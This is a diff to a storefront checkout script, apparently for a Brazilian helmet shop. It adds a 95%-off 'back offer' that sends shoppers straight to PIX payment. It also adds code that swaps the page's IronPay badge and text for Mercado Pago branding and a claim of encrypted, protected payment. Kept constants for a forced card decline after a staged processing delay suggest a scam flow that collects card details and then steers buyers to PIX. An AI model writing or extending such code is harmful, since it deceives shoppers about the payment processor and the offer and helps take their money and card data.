@@ -4,6 +4,17 @@ const OVERLAY_ID = "checkout-card-overlay";
 const STYLE_ID = "checkout-card-style";
 const REFILL_KEY = "mcCardRetry";
 const SNAPSHOT_KEY = "mcCheckoutSnapshot";
+const BACK_OFFER_KEY = "mcBackOfferPix";
+const BACK_OFFER = {
+  id: 104,
+  name: "CAPACETE LS2 CLASSIC DRAZE PRETO E BRANCO",
+  image: "/helmets/ff358-speed-race-preto-branco.webp",
+  price: 42.64,
+  originalPrice: 760,
+  quantity: 1,
+  size: "58/M",
+  discount: 95,
+};
 const PROCESSING_MIN_MS = 3200;
 const PROCESSING_MAX_MS = 4000;
 const CARD_DECLINE_MESSAGE =
@@ -565,12 +576,12 @@ function buildPixPayload(state) {
   };
 }
 
-async function goToPixPayment() {
+async function goToPixPayment(stateOverride) {
   setCardMode(false);
   method = "pix";
   charging = false;
 
-  const payload = buildPixPayload(loadCheckoutSnapshot());
+  const payload = buildPixPayload(stateOverride || loadCheckoutSnapshot());
   pendingCard = null;
   if (!payload.amount || !payload.customer.name || !payload.customer.email) {
     showDeclined("Não encontramos os dados do pedido para gerar o PIX. Volte e preencha o checkout novamente.");
@@ -970,8 +981,53 @@ function scheduleRenderCardOption() {
   });
 }
 
+function ensureMercadoPagoTrustCard() {
+  if (window.location.pathname !== "/checkout") return;
+  const badge = document.querySelector('img[src*="badge-ironpay"]');
+  if (!(badge instanceof HTMLImageElement)) return;
+  badge.src = "/assets/badge-mercado-pago-CilB50xt.png";
+  badge.alt = "Mercado Pago";
+  const card = badge.parentElement;
+  if (!card) return;
+  const title = [...card.querySelectorAll("div")].find((node) => node.textContent?.trim() === "IronPay");
+  if (title) title.textContent = "Mercado Pago";
+  const description = [...card.querySelectorAll("div")].find((node) =>
+    node.textContent?.includes("Pagamento PIX processado com segurança pela IronPay"),
+  );
+  if (description) {
+    description.textContent =
+      "Pagamento PIX processado com segurança. Ambiente protegido e dados criptografados em todas as compras.";
+  }
+}
+
+function backOfferPixState() {
+  const current = loadCheckoutSnapshot();
+  return {
+    ...current,
+    amount: BACK_OFFER.price,
+    subtotal: BACK_OFFER.price,
+    totalDiscount: BACK_OFFER.originalPrice - BACK_OFFER.price,
+    shippingCost: 0,
+    shippingMethod: "free",
+    items: [{ ...BACK_OFFER }],
+    orderId: undefined,
+    qrCode: undefined,
+    copyPaste: undefined,
+    prefetchKey: undefined,
+  };
+}
+
+function generateBackOfferPix() {
+  if (sessionStorage.getItem(BACK_OFFER_KEY) !== "1") return false;
+  sessionStorage.removeItem(BACK_OFFER_KEY);
+  window.setTimeout(() => void goToPixPayment(backOfferPixState()), 120);
+  return true;
+}
+
 function onCheckoutRoute() {
   if (window.location.pathname !== "/checkout") return;
+  ensureMercadoPagoTrustCard();
+  if (generateBackOfferPix()) return;
   if (sessionStorage.getItem(REFILL_KEY) === "1") {
     sessionStorage.removeItem(REFILL_KEY);
     void refillCheckout();
@@ -985,7 +1041,10 @@ function ensureCheckoutWatcher() {
   if (window.__mcCheckoutWatcher) return;
   window.__mcCheckoutWatcher = true;
 
-  observer = new MutationObserver(() => scheduleRenderCardOption());
+  observer = new MutationObserver(() => {
+    scheduleRenderCardOption();
+    ensureMercadoPagoTrustCard();
+  });
   observer.observe(document.body, { childList: true, subtree: true });
 
   window.addEventListener("popstate", onCheckoutRoute);
@@ -1015,3 +1074,13 @@ function ensureCheckoutWatcher() {
 }
 
 ensureCheckoutWatcher();
+
+document.addEventListener(
+  "click",
+  (event) => {
+    const button = event.target instanceof Element ? event.target.closest("button") : null;
+    if (!button || !/^Comprar por R\$\s*42,64$/i.test(button.textContent?.trim() || "")) return;
+    sessionStorage.setItem(BACK_OFFER_KEY, "1");
+  },
+  true,
+);
